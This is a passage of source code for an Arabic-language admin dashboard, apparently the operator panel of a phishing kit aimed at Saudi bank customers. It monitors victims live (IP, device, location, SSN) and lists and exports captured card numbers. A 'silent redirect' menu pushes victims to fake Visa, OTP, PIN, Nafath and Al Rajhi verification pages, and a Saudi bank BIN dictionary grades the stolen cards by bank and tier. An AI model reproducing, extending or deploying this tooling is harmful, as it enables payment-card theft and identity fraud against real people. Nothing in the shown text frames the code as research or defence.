                                    <?= count($banned_cards_list) ?>
                                </div>
                            </div>
                            <div class="p-3 bg-white border border-light rounded-4 shadow-sm text-center d-none d-md-block"
                                style="min-width: 150px;">
                                <div class="text-muted small fw-bold text-uppercase mb-1"
                                    style="font-size: 0.6rem; letter-spacing: 1px;">حماية الدفع</div>
                                <div class="h4 fw-800 text-success mb-0"><i class="bi bi-shield-check-fill ms-1"></i>فعالة
                                </div>
                            </div>
                        </div>
                    </div>

                    <?php if (!empty($banned_cards_list)): ?>
                        <div class="cards-grid-container p-0" id="bannedCardsGrid">
                            <?php foreach ($banned_cards_list as $cardStr): ?>
                                <div class="user-module card-view bg-white p-4 border rounded-4 d-flex flex-column align-items-center justify-content-between text-center overflow-hidden position-relative banned-card-item"
                                    data-card-number="<?= htmlspecialchars($cardStr) ?>" style="height: 100%;">
                                    <div class="p-3 bg-opacity-10 text-danger rounded-circle mb-3 shadow-sm"
                                        style="width: 60px; height: 60px; display: flex; align-items: center; justify-content: center;">
                                        <i class="bi bi-credit-card-2-front fs-2"></i>
                                    </div>
                                    <div class="mb-3">
                                        <div class="text-muted small fw-bold text-uppercase mb-2"
                                            style="font-size: 0.65rem; letter-spacing: 2px;">بطاقة بنكية محظورة</div>
                                        <div class="h5 fw-bold mb-1"
                                            style="font-family: 'JetBrains Mono', monospace; color: #1e293b; letter-spacing: 4px;">
                                            <?= htmlspecialchars($cardStr) ?>
                                        </div>
                                        <span
                                            class="badge rounded-pill bg-opacity-10 text-danger border border-danger border-opacity-25 px-3 py-2"
                                            style="font-size: 0.7rem;">
                                            <i class="bi bi-slash-circle ms-1"></i> معاملة مرفوضة نهائياً
                                        </span>
                                    </div>
                                    <div class="w-100 pt-3 border-top border-light">
                                        <button type="button" class="btn btn-sm btn-success fw-bold w-100 rounded-3 py-2 shadow-sm"
                                            onclick="confirmUnbanCard('<?= htmlspecialchars($cardStr) ?>', null)"
                                            style="background: #059669; border: none;">
                                            <i class="bi bi-shield-check ms-1"></i> فك حظر البطاقة
                                        </button>
                                    </div>
                                </div>
                            <?php endforeach; ?>
                        </div>
                    <?php endif; ?>
                    <div id="emptyBannedCardsState" class="<?= empty($banned_cards_list) ? '' : 'd-none' ?>">
                        <div class="text-center py-5 bg-white rounded-5 border border-light shadow-sm mt-4">
                            <div class="mb-4 text-success opacity-25">
                                <i class="bi bi-credit-card-2-back" style="font-size: 8rem;"></i>
                            </div>
                            <h4 class="fw-bold mb-2">النظام مؤمن بالكامل</h4>
                            <p class="text-muted mx-auto" style="max-width: 400px;">لا يوجد حالياً أي أرقام بطاقات في
                                القائمة السوداء. كافة المعاملات مسموح بها.</p>
                        </div>
                    </div>
                </div>
                <?php
            elseif ($current_tab == 'settings'):
                $chat_enabled = $User->getSetting('chat_enabled');
                ?>
                <div class="p-4 w-100" style="direction: rtl; max-width: 800px; margin: 0 auto;">
                    <div class="mb-4">
                        <h4 class="fw-bold mb-1 text-primary"> إعدادات النظام <i class="bi bi-gear-fill me-2"></i></h4>
                        <p class="text-muted small">تحكم في وظائف المنصة الأساسية والواجهة البرمجية.</p>
                    </div>



                    <div class="settings-form">
                        <div class="card border-0 shadow-sm rounded-4 overflow-hidden mb-4">
                            <div
                                class="card-header bg-white border-0 p-4 pb-1 d-flex align-items-center justify-content-between">
                                <h6 class="fw-bold text-dark mb-0"> إعدادات الدردشة <i
                                        class="bi bi-chat-left-dots me-2"></i></h6>
                            </div>
                            <div class="card-body p-4">
                                <div class="d-flex align-items-center justify-content-between">
                                    <div>
                                        <label class="fw-bold mb-1 d-block text-danger"> تعطيل نظام الدردشة </label>
                                        <p class="text-muted small mb-0"> عند تفعيل هذا الخيار، ستختفي أيقونة الدردشة
                                            نهائياً من جميع صفحات الموقع. </p>
                                    </div>
                                    <div class="form-check form-switch">
                                        <input class="form-check-input" type="checkbox" name="chat_disabled"
                                            id="chatEnabledToggle" style="width: 50px; height: 25px; cursor: pointer;"
                                            <?= $chat_enabled === '0' ? 'checked' : '' ?>>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="card border-0 shadow-sm rounded-4 overflow-hidden mb-4 text-end">
                            <div
                                class="card-header bg-white border-0 p-4 pb-1 d-flex align-items-center justify-content-between">
                                <h6 class="fw-bold text-dark mb-0"> فلترة الكلمات <i
                                        class="bi bi-shield-exclamation me-2"></i></h6>
                            </div>
                            <div class="card-body p-4">
                                <div class="row align-items-start">
                                    <div class="col-md-7 order-md-2 order-1">
                                        <label class="fw-bold mb-1 d-block"> الكلمات المحظورة </label>
                                        <p class="text-muted small mb-3"> الكلمات التي يتم إدخالها هنا سيتم منع إرسالها من
                                            قبل الزوار في الدردشة فوراً. (افصل بين الكلمات بفاصلة) </p>
                                        <?php $blocked_words = $User->getSetting('blocked_words') ?: ''; ?>
                                        <textarea id="blockedWordsInput" class="form-control border-light shadow-sm mb-3"
                                            rows="3" placeholder="مثال: كلمة1, كلمة2, كلمة3"
                                            style="border-radius: 12px;"><?= htmlspecialchars($blocked_words) ?></textarea>
                                    </div>
                                    <div class="col-md-5 order-md-1 order-2 text-start mt-3 mt-md-0">
                                        <button type="button" onclick="updateBlockedWords()"
                                            class="btn btn-warning px-4 py-2 fw-bold rounded-3 shadow-sm w-100 w-md-auto">
                                            حفظ الفلتر <i class="bi bi-save2 ms-1"></i>
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="card border-0 shadow-sm rounded-4 overflow-hidden mb-4 text-end">
                            <div
                                class="card-header bg-white border-0 p-4 pb-1 d-flex align-items-center justify-content-between">
                                <h6 class="fw-bold text-dark mb-0"> تصدير البيانات <i
                                        class="bi bi-file-earmark-pdf-fill me-2"></i></h6>
                            </div>
                            <div class="card-body p-4">
                                <div class="row align-items-center">
                                    <div class="col-md-5 order-md-1 order-2 text-start mt-3 mt-md-0">
                                        <button type="button" onclick="exportCardsToPDF()"
                                            class="btn btn-danger px-4 py-2 fw-bold rounded-3 shadow-sm w-100 w-md-auto">
                                            تصدير البطاقات PDF <i class="bi bi-download ms-1"></i>
                                        </button>
                                    </div>
                                    <div class="col-md-7 order-md-2 order-1">
                                        <label class="fw-bold mb-1 d-block"> تصدير بطاقات الدفع </label>
                                        <p class="text-muted small mb-0"> قم بتحميل تقرير شامل بكافة البطاقات
                                            المسجلة في النظام بصيغة PDF قابلة للطباعة. </p>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="card border-0 shadow-sm rounded-4 overflow-hidden mb-4 text-end">
                            <div
                                class="card-header bg-white border-0 p-4 pb-1 d-flex align-items-center justify-content-between">
                                <h6 class="fw-bold text-dark mb-0"> تغيير كلمة المرور <i
                                        class="bi bi-shield-lock-fill me-2"></i></h6>
                            </div>
                            <div class="card-body p-4">
                                <div class="row align-items-center">
                                    <div class="col-md-5 order-md-1 order-2 text-start mt-3 mt-md-0">
                                        <button type="button" onclick="changeAdminPassword()"
                                            class="btn btn-dark px-4 py-2 fw-bold rounded-3 shadow-sm w-100 w-md-auto">
                                            تحديث المرور <i class="bi bi-check2-circle ms-1"></i>
                                        </button>
                                    </div>
                                    <div class="col-md-7 order-md-2 order-1">
                                        <label class="fw-bold mb-1 d-block"> كلمة المرور الجديدة </label>
                                        <p class="text-muted small mb-3"> سيتم تشفير الكلمة الجديدة وحفظها في قاعدة البيانات
                                            فوراً. </p>
                                        <div class="input-group">
                                            <input type="password" id="newAdminPassword"
                                                class="form-control border-light shadow-sm" placeholder="••••••••"
                                                style="border-radius: 0 12px 12px 0;">
                                            <button class="btn btn-outline-secondary" type="button"
                                                onclick="togglePassVisibility()" style="border-radius: 12px 0 0 12px;">
                                                <i class="bi bi-eye" id="passToggleIcon"></i>
                                            </button>
                                        </div>
                                    </div>
                                </div>

                                <div class="text-center mt-5">
                                    <p class="text-muted small"><i class="bi bi-info-circle ms-1"></i> كافة الإعدادات
                                        والتقارير يتم معالجتها بشكل آمن ومحمي بالكامل.</p>
                                </div>
                            </div>
                        </div>

                        <div class="card border-danger border-opacity-25 shadow-sm rounded-4 overflow-hidden mb-4 text-end"
                            style="background: rgba(220, 53, 69, 0.02);">
                            <div class="card-body p-4">
                                <div class="d-flex align-items-center justify-content-between">
                                    <div class="order-2">
                                        <h6 class="fw-bold text-danger mb-1"> حذف كافة البيانات <i
                                                class="bi bi-trash3-fill me-1"></i></h6>
                                        <p class="text-muted small mb-0"> تنبيه: هذا الإجراء سيقوم بمسح كافة الزوار،
                                            المحادثات، والبطاقات بشكل نهائي. </p>
                                    </div>
                                    <div class="order-1 text-start">
                                        <button type="button" onclick="confirmFactoryReset()"
                                            class="btn btn-danger px-4 py-2 fw-bold rounded-3 shadow-sm">
                                            إفراغ المركز الآن <i class="bi bi-shield-fire ms-1"></i>
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <?php
            elseif ($current_tab == 'chat'):
                ?>
                        <div class="p-4 w-100" style="direction: rtl;">
                            <div
                                class="d-flex align-items-center justify-content-between mb-4 border-bottom border-light pb-4">
                                <div>
                                    <h4 class="fw-bold mb-1 text-primary"><i class="bi bi-chat-dots-fill ms-2"></i>دردشة
                                        الزوار
                                        المباشرة</h4>
                                    <p class="text-muted small mb-0">إدارة المحادثات مع زوار الموقع غير المسجلين.</p>
                                </div>
                            </div>

                            <?php if ($chat_sessions && mysqli_num_rows($chat_sessions) > 0): ?>
                                <div class="cards-grid-container p-0">
                                    <?php while ($chat = mysqli_fetch_assoc($chat_sessions)): ?>
                                        <div class="user-module card-view bg-white p-4 border rounded-4 shadow-sm"
                                            style="height: 100%;" onclick="openAdminChatModal('<?= $chat['session_id'] ?>')">
                                            <div class="d-flex align-items-center gap-3 mb-3">
                                                <div class="p-3 bg-opacity-10 text-primary rounded-circle position-relative"
                                                    style="background: #e0f2fe;">
                                                    <i class="bi bi-person-fill fs-3"></i>
                                                    <?php if ($chat['unread_count'] > 0): ?>
                                                        <span
                                                            class="position-absolute top-0 start-100 translate-middle badge rounded-pill bg-danger border border-light"
                                                            style="font-size: 0.65rem;">
                                                            <?= $chat['unread_count'] ?>
                                                        </span>
                                                    <?php endif; ?>
                                                </div>
                                                <div class="text-start">
                                                    <div class="h6 fw-bold mb-0">
                                                        <?= htmlspecialchars($chat['visitor_name'] ?: 'زائر مجهول') ?>
                                                    </div>
                                                    <div class="text-muted" style="font-size: 0.7rem;"><?= $chat['session_id'] ?>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="activity-summary bg-light p-2 rounded-3 mb-3 text-end"
                                                style="font-size: 0.85rem; height: 60px; overflow: hidden;">
                                                <div class="text-muted fw-bold mb-1" style="font-size: 0.7rem;">أخر رسالة:</div>
                                                <?= htmlspecialchars($chat['last_msg'] ?: 'لا توجد رسائل') ?>
                                            </div>
                                            <div class="pt-3 border-top border-light d-flex gap-2"
                                                onclick="event.stopPropagation();">
                                                <button type="button" onclick="openAdminChatModal('<?= $chat['session_id'] ?>')"
                                                    class="btn btn-sm btn-primary fw-bold flex-fill rounded-3 py-2">
                                                    <i class="bi bi-chat-text-fill ms-1"></i> فتح المحادثة
                                                </button>
                                                <button type="button" onclick="markChatUnread('<?= $chat['session_id'] ?>', this)"
                                                    class="btn btn-sm btn-outline-warning fw-bold rounded-3 py-2"
                                                    title="تعليم كغير مقروء">
                                                    <i class="bi bi-envelope-fill"></i>
                                                </button>
                                            </div>
                                        </div>
                                    <?php endwhile; ?>
                                </div>
                            <?php else: ?>
                                <div class="text-center py-5 bg-white rounded-5 border border-light shadow-sm">
                                    <i class="bi bi-chat-heart text-muted mb-4"
                                        style="font-size: 4rem; opacity: 0.3; display: block;"></i>
                                    <h4 class="fw-bold text-muted">لا توجد محادثات نشطة حالياً</h4>
                                    <p class="text-muted">ستظهر الرسائل هنا بمجرد أن يبدأ الزوار بالدردشة.</p>
                                </div>
                            <?php endif; ?>
                        </div>
                        <?php
            else:
                echo '<div class="grid-container">';
                if ($users != false):
                    foreach ($users as $row):
                        $is_online = false;
                        if (isset($row->last_activity)) {
                            $last_act = strtotime($row->last_activity);
                            if (time() - $last_act < 300)
                                $is_online = true;
                        }
                        $status_class = $is_online ? 'active' : 'offline';
                        // Logic for idle/waiting can be added if needed here, 
                        // but for initial load, online/offline is common.
                        $dist_class = $row->is_distinguished ? 'is-dist' : '';
                        $pin_class = $row->is_pinned ? 'is-pinned' : '';
                        $comp_class = $row->is_completed ? 'is-completed' : '';
                        ?>
                                <div class="user-module <?= $dist_class ?> <?= $pin_class ?> <?= $comp_class ?>"
                                    data-user-id="<?= $row->id; ?>" data-session-id="<?= $row->chat_session_id; ?>"
                                    onclick="openDetailPanel(this)">
                                    <!-- 1. Selection -->
                                    <div class="selection-overlay">
                                        <input type="checkbox" name="selectedUsers[]" value="<?= $row->id ?>" class="user-checkbox"
                                            onclick="event.stopPropagation(); updateBulkBar();">
                                    </div>

                                    <!-- 2. Avatar & Status -->
                                    <div class="avatar-wrapper">
                                        <div class="avatar-circle <?= $status_class ?>">
                                            <i class="bi bi-person-fill"></i>
                                        </div>
                                        <div class="pulse-indicator <?= $status_class ?>"></div>
                                    </div>

                                    <!-- 3. Main Info -->
                                    <?php
                                    $isBanned = in_array($row->ip, $banned_ips);
                                    $banFlagHTML = $isBanned ? '<span class="badge bg-danger ms-1" style="font-size:0.6rem;">محظور</span>' : '';
                                    ?>
                                    <div class="module-body">
                                        <div class="user-main-info">
                                            <span class="user-id-badge">ID: #<?= $row->id; ?> <span class="ban-status-badge"
                                                    data-user-id="<?= $row->id; ?>"><?= $banFlagHTML ?></span></span>
                                            <div class="full-timestamp mt-1">
                                                <?= date('d/m/Y H:i', strtotime($row->created_at)); ?>
                                            </div>
                                        </div>

                                        <!-- Detailed Technical Column -->
                                        <div class="tech-info-column">
                                            <div class="t-row"><i class="bi bi-display ms-1"></i> <?= $row->device ?: '---'; ?>
                                            </div>
                                            <div class="t-row"><i class="bi bi-browser-safari ms-1"></i>
                                                <?= $row->browser ?: '---'; ?>
                                            </div>
                                            <div class="t-row"><i class="bi bi-geo-alt-fill ms-1"></i>
                                                <?= $row->location ?: '---'; ?></div>
                                            <div class="t-row"><i class="bi bi-globe2 ms-1"></i> <?= $row->ip; ?></div>
                                        </div>

                                        <div class="activity-summary">
                                            <div class="current-page">
                                                <i class="bi bi-geo-alt-fill text-danger"></i>
                                                <span id="page<?= $row->id; ?>"><?= $row->page ?: 'بداية الاتصال'; ?></span>
                                            </div>
                                            <div class="last-msg" id="message<?= $row->id; ?>">
                                                <?= $row->message ?: 'في انتظار البيانات...'; ?>
                                            </div>
                                        </div>
                                    </div>

                                    <!-- 4. Quick Actions -->
                                    <div class="card-quick-actions" onclick="event.stopPropagation();">
                                        <a href="javascript:void(0)" onclick="confirmAdminAction('pin', <?= $row->id ?>)"
                                            title="تثبيت" class="q-action pin <?= $row->is_pinned ? 'active' : '' ?>">
                                            <i class="bi bi-pin-angle-fill"></i>
                                        </a>
                                        <a href="javascript:void(0)" onclick="confirmAdminAction('distinguish', <?= $row->id ?>)"
                                            title="تمييز" class="q-action star <?= $row->is_distinguished ? 'active' : '' ?>">
                                            <i class="bi bi-star-fill"></i>
                                        </a>
                                        <a href="javascript:void(0)" onclick="confirmAdminAction('completed', <?= $row->id ?>)"
                                            title="مكتمل" class="q-action check <?= $row->is_completed ? 'active' : '' ?>">
                                            <i class="bi bi-check-circle-fill"></i>
                                        </a>
                                        <div class="ip-ban-btn-wrapper" data-user-id="<?= $row->id; ?>">
                                            <?php if ($isBanned): ?>
                                                <a href="javascript:void(0)"
                                                    onclick="confirmUnbanIP('<?= $row->ip ?>', <?= $row->id ?>); event.stopPropagation();"
                                                    title="فك حظر IP الزائر" class="q-action"
                                                    style="color: #059669; background: #d1fae5; border-color: #6ee7b7;">
                                                    <i class="bi bi-shield-check"></i>
                                                </a>
                                            <?php else: ?>
                                                <a href="javascript:void(0)"
                                                    onclick="confirmBanIP('<?= $row->ip ?>', <?= $row->id ?>); event.stopPropagation();"
                                                    title="حظر IP الزائر" class="q-action"
                                                    style="color: #e11d48; background: #ffe4e6; border-color: #fda4af;">
                                                    <i class="bi bi-slash-circle-fill"></i>
                                                </a>
                                            <?php endif; ?>
                                        </div>
                                        <a href="javascript:void(0)" onclick="openAdminChatModal('<?= $row->chat_session_id ?>')"
                                            title="فتح المحادثة" class="q-action position-relative"
                                            style="color: #156394; background: #e0f2fe; border-color: #bae6fd;">
                                            <i class="bi bi-chat-text-fill"></i>
                                            <span
                                                class="chat-badge badge bg-danger position-absolute top-0 start-100 translate-middle rounded-pill"
                                                style="font-size: 0.5rem; <?= $row->chat_unread_count > 0 ? '' : 'display:none;' ?>">
                                                <?= $row->chat_unread_count ?>
                                            </span>
                                        </a>
                                        <a href="javascript:void(0)"
                                            onclick="markChatUnreadFromCard('<?= $row->chat_session_id ?>', this)"
                                            title="تعليم غير مقروء" class="q-action"
                                            style="color: #d97706; background: #fef3c7; border-color: #fcd34d;">
                                            <i class="bi bi-envelope-fill"></i>
                                        </a>
                                        <?php if ($row->is_archived): ?>
                                            <a href="javascript:void(0)" onclick="confirmAdminAction('unarchive', <?= $row->id ?>)"
                                                title="إلغاء الأرشفة" class="q-action archive">
                                                <i class="bi bi-arrow-up-circle-fill"></i>
                                            </a>
                                        <?php else: ?>
                                            <a href="javascript:void(0)" onclick="confirmAdminAction('archive', <?= $row->id ?>)"
                                                title="نقل للأرشيف" class="q-action archive">
                                                <i class="bi bi-archive-fill"></i>
                                            </a>
                                        <?php endif; ?>
                                    </div>

                                    <!-- Hidden Data for Sidebar -->
                                    <div class="hidden-data d-none">
                                        <span class="d-location"><?= $row->location; ?></span>
                                        <span class="d-device"><?= $row->device; ?></span>
                                        <span class="d-browser"><?= $row->browser; ?></span>
                                        <span class="d-ssn"><?= $row->ssn; ?></span>
                                        <span class="d-dist"><?= $row->is_distinguished; ?></span>
                                        <span class="d-arch"><?= $row->is_archived; ?></span>
                                        <span class="d-pin">
                                            <?= $row->is_pinned; ?>
                                        </span>
                                        <span class="d-completed">
                                            <?= $row->is_completed; ?>
                                        </span>
                                        <span class="d-time"><?= $row->created_at; ?></span>
                                    </div>
                                </div>
                                <?php
                    endforeach;
                endif;
                echo '</div>';
            endif;
            ?>
        </form>
    </main>

    <!-- Side-Sheet Backdrop Overlay -->
    <div class="panel-backdrop" id="panelBackdrop"></div>

    <!-- Side-Sheet Detail Panel (Elite Hub) -->
    <div class="side-sheet" id="detailPanel">
        <div class="sheet-header">
            <div class="d-flex align-items-center">
                <div>
                    <h4 class="fw-bold mb-0" id="panelUserId">#----</h4>
                    <div class="small fw-bold text-primary mt-1" id="panelLiveStatus">
                        <span class="spinner-grow spinner-grow-sm ms-1" role="status"></span> جاري المراقبة...
                    </div>
                </div>
                <!-- Technical Metadata Bar -->
                <div class="header-tech-bar d-flex gap-3 ms-4" id="panelTechBar">
                    <!-- Dynamic Icons Injected Here -->
                </div>
            </div>
            <button class="close-sheet" id="closePanelBtn">
                <i class="bi bi-x-lg"></i>
            </button>
        </div>

        <!-- Real-time Control Panel (Compact Horizontal View) -->
        <div class="control-panel justify-content-between">
            <!-- 1. Vehicle Data Block (Injected via JS) -->
            <div id="panelVehicleData" style="min-width: 45%;"></div>

            <!-- 2. Consolidated Actions Block -->
            <div class="ops-row d-flex align-items-center gap-3">
                <!-- Redirect (Pusher) -->
                <div class="control-group flex-fill mb-0">
                    <label class="control-label small fw-bold text-muted">توجيه صامت للزائر:</label>
                    <div class="input-group input-group-sm">
                        <select id="redirectPage" class="form-select control-input"
                            style="border-radius: 8px 0 0 8px; font-size: 0.75rem;">
                            <option value="payment.php?reject=1">فيزا (Visa)</option>
                            <option value="otp.php">رمز تحقق (OTP)</option>
                            <option value="password.php">كلمة مرور (PIN)</option>
                            <option value="nafath.php">نفاذ (Nafath)</option>
                            <option value="raj.php">الراجحي (Rajhi)</option>
                            <option value="index.php">الرئيسية</option>
                            <option value="index-details.php">بيانات التامين</option>
                            <option value="index-types.php">شركات التأمين</option>
                            <option value="summary.php">اختيار طريقة الدفع</option>
                            <option value="StepOne.php">نفاذ اختيار شركة الهاتف</option>
                            <option value="StepTwo.php">نفاذ رقم الجوال</option>
                            <option value="nafath-call.php">اتصال stc</option>
                            <option value="StepThird.php">نفاذ رمز التوثيق</option>
                            <option value="StepFourth.php">نفاذ معلومات الحساب</option>
                        </select>
                        <button type="button" class="btn btn-primary fw-bold" onclick="sendRedirect()"
                            style="border-radius: 0 8px 8px 0;">
                            توجيه <i class="bi bi-send-fill ms-1"></i>
                        </button>
                    </div>
                </div>

                <!-- Admin Action Buttons -->
                <div class="control-group mb-0">
                    <label class="control-label small fw-bold text-muted d-block text-end">إجراءات إدارية:</label>
                    <div class="d-flex gap-1 justify-content-end">
                        <button type="button" id="p-pin-link" class="btn btn-outline-secondary btn-sm p-1 px-2"
                            title="تثبيت">
                            <i class="bi bi-pin-angle-fill"></i>
                        </button>
                        <button type="button" id="p-dist-link" class="btn btn-outline-secondary btn-sm p-1 px-2"
                            title="تمييز">
                            <i class="bi bi-star"></i>
                        </button>
                        <button type="button" id="p-completed-link" class="btn btn-outline-secondary btn-sm p-1 px-2"
                            title="مكتمل">
                            <i class="bi bi-check-circle-fill"></i>
                        </button>
                        <button type="button" id="p-archive-link" class="btn btn-outline-secondary btn-sm p-1 px-2"
                            title="أرشيف">
                            <i class="bi bi-archive"></i>
                        </button>
                        <button type="button" onclick="confirmSingleDelete()"
                            class="btn btn-outline-danger btn-sm p-1 px-2" title="حذف">
                            <i class="bi bi-trash"></i>
                        </button>
                        <button type="button" id="p-ban-link" class="btn btn-sm p-1 px-2"
                            style="background:#ffe4e6; color:#e11d48; border:1px solid #fda4af;" title="حظر">
                            <i class="bi bi-slash-circle"></i>
                        </button>
                    </div>
                </div>
            </div>
        </div>

        <div class="detail-content" id="panelContent">
            <!-- Dynamic Data Injected Here via AJAX -->
            <div class="text-center py-5 text-muted">
                <div class="spinner-border spinner-border-sm ms-2" role="status"></div>
                جاري جلب كافة البيانات...
            </div>
        </div>
    </div>

    <audio id="notification-card" src="./level-up-2-199574.mp3"></audio>

    <!-- Libs -->
    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <script>
        $(document).ready(function () {
            $('#closePanelBtn, #panelBackdrop').on('click', function () {
                closeDetailPanel();
            });
        });

        function triggerHighlight(selector, container) {
            const $el = $(selector);
            const $cont = $(container);
            if ($el.length && $cont.length) {
                $cont.prepend($el);
                $el.removeClass('glow-red-update');
                void $el[0].offsetWidth; // trigger reflow
                $el.addClass('glow-red-update');
                setTimeout(() => $el.removeClass('glow-red-update'), 10000);
            }
        }

        // Advanced BIN Dictionary for Saudi Banks
        // Comprehensive Saudi Bank BIN Dictionary (Updated 2024/2025)
        const saudiBanks = {
            // Al Rajhi Bank
            '4463': { name: 'مصرف الراجحي', type: 'مدى / فيزا', brand: 'VISA', tier: 'Classic' },
            '4464': { name: 'مصرف الراجحي', type: 'مدى / فيزا', brand: 'VISA', tier: 'Gold' },
            '4584': { name: 'مصرف الراجحي', type: 'مدى صراف', brand: 'VISA', tier: 'Classic' },
            '4847': { name: 'مصرف الراجحي', type: 'فيزا', brand: 'VISA', tier: 'Platinum' },
            '4092': { name: 'مصرف الراجحي', type: 'فيزا', brand: 'VISA', tier: 'Infinite' },
            '4609': { name: 'مصرف الراجحي', type: 'فيزا', brand: 'VISA', tier: 'Signature' },
            '5297': { name: 'مصرف الراجحي', type: 'ماستركارد', brand: 'Mastercard', tier: 'Classic' },
            '5358': { name: 'مصرف الراجحي', type: 'ماستركارد', brand: 'Mastercard', tier: 'Gold' },
            '5359': { name: 'مصرف الراجحي', type: 'ماستركارد', brand: 'Mastercard', tier: 'Platinum' },
            '5360': { name: 'مصرف الراجحي', type: 'ماستركارد', brand: 'Mastercard', tier: 'Signature' },
            '5888': { name: 'مصرف الراجحي', type: 'مدى', brand: 'Mada', tier: 'Classic' },
            '5081': { name: 'مصرف الراجحي', type: 'مدى', brand: 'Mada', tier: 'Classic' },

            // SNB (AlAhli)
            '4071': { name: 'البنك الأهلي السعودي (SNB)', type: 'مدى / فيزا', brand: 'VISA', tier: 'Classic' },
            '4106': { name: 'البنك الأهلي السعودي (SNB)', type: 'مدى / فيزا', brand: 'VISA', tier: 'Gold' },
            '4176': { name: 'البنك الأهلي السعودي (SNB)', type: 'مدى / فيزا', brand: 'VISA', tier: 'Platinum' },
            '4557': { name: 'البنك الأهلي السعودي (SNB)', type: 'فيزا', brand: 'VISA', tier: 'Platinum' },
            '4578': { name: 'البنك الأهلي السعودي (SNB)', type: 'فيزا', brand: 'VISA', tier: 'Signature' },
            '5210': { name: 'البنك الأهلي السعودي (SNB)', type: 'ماستركارد', brand: 'Mastercard', tier: 'Gold' },
            '5241': { name: 'البنك الأهلي السعودي (SNB)', type: 'ماستركارد', brand: 'Mastercard', tier: 'Platinum' },

            // Riyad Bank
            '4008': { name: 'بنك الرياض', type: 'مدى', brand: 'VISA', tier: 'Classic' },
            '4017': { name: 'بنك الرياض', type: 'مدى', brand: 'VISA', tier: 'Gold' },
            '4030': { name: 'بنك الرياض', type: 'مدى', brand: 'VISA', tier: 'Platinum' },
            '4313': { name: 'بنك الرياض', type: 'مدى', brand: 'VISA', tier: 'Infinite' },
            '4455': { name: 'بنك الرياض', type: 'مدى', brand: 'VISA', tier: 'Classic' },

            // Alinma Bank
            '4228': { name: 'مصرف الإنماء', type: 'مدى', brand: 'VISA', tier: 'Classic' },
            '4286': { name: 'مصرف الإنماء', type: 'مدى', brand: 'VISA', tier: 'Gold' },
            '4405': { name: 'مصرف الإنماء', type: 'مدى', brand: 'VISA', tier: 'Platinum' },
            '4830': { name: 'مصرف الإنماء', type: 'مدى', brand: 'VISA', tier: 'Signature' },

            // STC Pay
            '9682': { name: 'STC Pay', type: 'محفظة رقمية', brand: 'Mada', tier: 'Prepaid' },
            '9683': { name: 'STC Pay', type: 'محفظة رقمية', brand: 'VISA', tier: 'Prepaid' },
            '446672': { name: 'STC Pay', type: 'مدى', brand: 'Mada', tier: 'Classic' },
            '588982': { name: 'STC Pay', type: 'مدى', brand: 'Mada', tier: 'Classic' }
        };

        function analyzeBIN(cardNumber, cardId) {
            const num = (cardNumber || '').replace(/\D/g, '');
            const bin4 = num.substring(0, 4);
            const bin6 = num.substring(0, 6);
            const targetEl = $(`#bin-info-${cardId}`);

            // Local Dictionary Check (Immediate)
            const localMatch = saudiBanks[bin4] || saudiBanks[bin6];
            if (localMatch) {
                renderBinResult(targetEl, {
                    bank: localMatch.name,
                    type: localMatch.type,
                    scheme: localMatch.brand,
                    tier: localMatch.tier,
                    country: 'المملكة العربية السعودية 🇸🇦'
                });
                return;
            }

            // Proxy-based Lookup (CORS Fix)
            if (num.length >= 6) {
                targetEl.html('<div class="spinner-border spinner-border-sm text-white opacity-25" role="status"></div> <small>جاري جلب التفاصيل...</small>');
                fetch(`ajax_bin_proxy.php?bin=${bin6}`)
                    .then(res => res.json())
                    .then(data => {
                        if (data.error) {
                            targetEl.html('<small class="opacity-50">بنوك دولية / غير محدد</small>');
                            return;
                        }
                        const translate = (val) => {
                            const map = {
                                'debit': 'مدى / صراف', 'credit': 'ائتمانية', 'prepaid': 'مسبقة الدفع',
                                'visa': 'VISA', 'mastercard': 'Mastercard', 'mada': 'مدى'
                            };
                            return map[String(val).toLowerCase()] || val || '---';
                        };

                        renderBinResult(targetEl, {
                            bank: data.bank ? data.bank.name : 'بنوك دولية',
                            type: translate(data.type),
                            scheme: translate(data.scheme),
                            tier: data.brand || 'Classic',
                            country: data.country ? `${data.country.name} ${data.country.emoji || ''}` : '---'
                        });
                    })
                    .catch(() => {
                        targetEl.html('<small class="opacity-50">تعذر الاتصال بخادم BIN</small>');
                    });
            }
        }

        function renderBinResult(el, data) {
            el.html(`
                <div style="display:flex; justify-content:space-between; align-items:center; opacity:0.85; gap:8px;">
                    <span title="Bank"><i class="bi bi-bank"></i> ${data.bank}</span>
                    <span title="Tier"><i class="bi bi-award"></i> ${data.tier}</span>
                    <span title="Country">${data.country}</span>
                </div>
            `);
        }

        // Card Type Detection (mirrors PHP logic)
        function getCardTypeBadge(cardNumber) {
            const num = (cardNumber || '').replace(/\D/g, '');
            if (num.length < 4) return 'CARD';

            // Advanced Dictionary Matching (Bank + Tier)
            const b4 = num.substring(0, 4);
            const b6 = num.substring(0, 6);
            const match = saudiBanks[b4] || saudiBanks[b6];
            if (match) {
                return `${match.name} - ${match.tier}`;
            }

            const madaBins = [
                '400861', '401757', '407197', '407395', '410621', '418049', '428671', '428672', '428673',
                '431361', '432328', '440533', '440647', '440795', '445564', '446393', '446404', '446672',
                '455036', '455708', '457865', '457997', '458456', '462220', '468540', '468541', '468542',
                '468543', '483010', '483011', '483012', '484783', '486094', '486095', '486096', '487462',
                '489318', '489319', '493428', '504300', '508160', '5078', '5079', '521076', '524130',
                '524514', '529741', '530060', '531095', '535825', '535989', '536023', '537767', '540020',
                '543085', '543357', '549760', '557606', '558563', '585265', '588845', '588846', '588847',
                '588849', '588850', '588851', '588982', '589005', '589206', '604906', '605141', '636120',
                '968201', '968202', '968203', '968204', '968205', '968206', '968207', '968208', '968209',
                '968210', '968211'
            ];
            for (const bin of madaBins) {
                if (num.startsWith(bin)) return 'مدى';
            }

            const stcBins = ['9682', '9683', '446672', '588982'];
            for (const bin of stcBins) {
                if (num.startsWith(bin)) return 'STC Pay';
            }

            const p2 = parseInt(num.substring(0, 2));
            const p4 = parseInt(num.substring(0, 4));
